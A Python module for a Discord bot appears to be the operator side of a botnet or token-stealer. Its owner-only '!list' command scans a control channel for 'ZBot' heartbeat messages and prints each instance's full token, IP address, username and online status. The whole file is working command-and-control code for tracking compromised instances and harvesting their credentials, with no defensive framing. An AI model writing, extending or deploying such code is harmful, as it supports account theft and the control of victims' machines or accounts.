"""
list_instances.py - !list
Scans the control channel and lists all active ZBot instances with full details.
"""
import re
import discord

OWNER_ID = 981259484691325018
CONTROL_CHANNEL_ID = 1508336791311089874

async def run(client, message, args):
    if message.author.id != OWNER_ID:
        await message.channel.send("Unauthorized.", delete_after=5)
        return
    if not CONTROL_CHANNEL_ID:
        await message.channel.send("Control channel not set.")
        return
    channel = client.get_channel(CONTROL_CHANNEL_ID)
    if not channel:
        await message.channel.send("Control channel not found.")
        return

    msgs = []
    try:
        async for msg in channel.history(limit=200):
            msgs.append(msg)
    except discord.Forbidden:
        await message.channel.send("Missing Read Message History permission.")
        return
    except Exception as e:
        await message.channel.send(f"Error reading history: {e}")
        return

    instances = {}
    for msg in msgs:
        content = msg.content
        if "ZBot" not in content:
            continue
        # Extract full ID and token using markers
        full_id_match = re.search(r'\[FULL_ID=([^\]]+)\]', content)
        token_match = re.search(r'\[FULL_TOKEN=([^\]]+)\]', content)
        ip_match = re.search(r'\[IP=([^\]]+)\]', content)
        if not full_id_match:
            continue
        full_id = full_id_match.group(1)
        token = token_match.group(1) if token_match else "N/A"
        ip = ip_match.group(1) if ip_match else "?"
        # Determine status
        status = "ON" if "🟢" in content else "OFF"
        # Extract user
        user_match = re.search(r'User: `([^`]+)`', content)
        username = user_match.group(1) if user_match else "?"
        # Keep newest per instance
        if full_id not in instances or msg.id > instances[full_id]["msg_id"]:
            instances[full_id] = {
                "full_id": full_id,
                "username": username,
                "token": token,
                "ip": ip,
                "status": status,
                "msg_id": msg.id
            }

    if not instances:
        await message.channel.send("No active instances found. Make sure at least one instance has sent a heartbeat (wait up to 60s).")
        return

    lines = []
    client._instance_map = {}
    idx = 1
    for full_id, data in instances.items():
        client._instance_map[idx] = full_id
        lines.append(
            f"{idx} | ZBot | Token: `{data['token']}` | "
            f"User: `{data['username']}` | "
            f"ID: `{full_id}` | "
            f"IP: {data['ip']} | Status: **{data['status']}**"
        )
        idx += 1

    content = "\n".join(lines)
    if len(content) > 1900:
        content = content[:1900] + "..."
    await message.channel.send(f"```\n{content}\n```")
